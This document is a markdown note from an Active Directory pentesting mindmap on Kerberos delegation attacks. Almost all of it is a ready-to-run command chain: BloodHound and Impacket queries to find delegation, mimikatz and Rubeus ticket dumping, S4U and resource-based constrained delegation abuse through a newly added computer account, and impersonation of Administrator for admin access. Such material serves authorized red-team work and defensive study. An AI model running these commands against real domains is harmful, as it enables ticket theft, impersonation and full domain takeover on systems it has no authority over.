---
title: "Kerberos Delegation"
category: delegation
color: "#099268"
tags:
  - ad-mindmap
  - delegation
  - cve
---

# 🎫 Kerberos Delegation

> [!info] Mindmap box `Kerberos Delegation`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Find delegation

- `findDelegation.py "<domain>"/"<user>":"<password>"` [↗](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)
- With BloodHound
    - Unconstrained
        - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c` [↗](https://github.com/SpecterOps/BloodHound)
        - `MATCH (c:User {unconstraineddelegation:true}) RETURN c` [↗](https://github.com/SpecterOps/BloodHound)
    - Constrained
        - `MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
        - `MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN p` [↗](https://github.com/SpecterOps/BloodHound)

## Unconstrained delegation
➡️ [[Lateral Movement|Kerberos TGT]] → [[Lateral Movement|PassTheTicket]]

- UAC: ADS_UF_TRUSTED_FOR_DELEGATION
    - Force connection  with coerce
        - Get tickets
            - `mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export` [↗](https://github.com/gentilkiwi/mimikatz)
            - `Rubeus.exe dump /service:krbtgt /nowrap` [↗](https://github.com/GhostPack/Rubeus)
            - `Rubeus.exe dump /luid:0xdeadbeef /nowrap` [↗](https://github.com/GhostPack/Rubeus)
            - `Rubeus.exe monitor /interval:5` [↗](https://github.com/GhostPack/Rubeus)

## Constrained delegation

- With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION
    - Get TGT for user
        - Request S4u2self
            - Request S4u2proxy
    - `Rubeus.exe hash /password:<password>` [↗](https://github.com/GhostPack/Rubeus)
        - `Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>` [↗](https://github.com/GhostPack/Rubeus)
            - `Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt` [↗](https://github.com/GhostPack/Rubeus)
                - Altservice HTTP/HOST/CIFS/LDAP ➡️ [[Lateral Movement|Kerberos TGS]]
    - `getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>` [↗](https://github.com/fortra/impacket/blob/master/examples/getST.py)
        - Altservice HTTP/HOST/CIFS/LDAP ➡️ [[Lateral Movement|Kerberos TGS]]
- Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION
    - Constrain between Y and Z
        - Add computer X
            - Add RBCD : delegate from X to Y
                - s4u2self X (impersonate admin)
                    - S4u2Proxy X (impersonate admin on spn/Y)
                        - Forwardable TGS for Y
                            - S4u2Proxy Y (impersonate admin on spn/Z)
    - add computer account
        - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'` [↗](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
    - RBCD With added computer account ➡️ [[Lateral Movement|Kerberos TGS]]
        - `rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$` [↗](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
            - `getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'` [↗](https://github.com/fortra/impacket/blob/master/examples/getST.py)
                - `getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>` [↗](https://github.com/fortra/impacket/blob/master/examples/getST.py)
    - Self RBCD `#CVE`
        - Like RBCD without add computer

## Resource-Based Constrained Delegation

- add computer account
    - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'` [↗](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
- RBCD With added computer account
    - `Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>` [↗](https://github.com/GhostPack/Rubeus)
        - `Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` [↗](https://github.com/GhostPack/Rubeus) ➡️ [[Admin Access|Admin]]
    - `rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>` [↗](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
        - `getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/getST.py) ➡️ [[Lateral Movement|Kerberos TGT]] → [[Admin Access|Admin]]

## S4U2self abuse

- Get machine account (X)'s TGT
    - Get a ST on X as user admin
- `getTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>" "<domain>"/"<machine>$"` [↗](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
    - `getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>" -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'` [↗](https://github.com/fortra/impacket/blob/master/examples/getST.py) ➡️ [[Admin Access|Admin]]
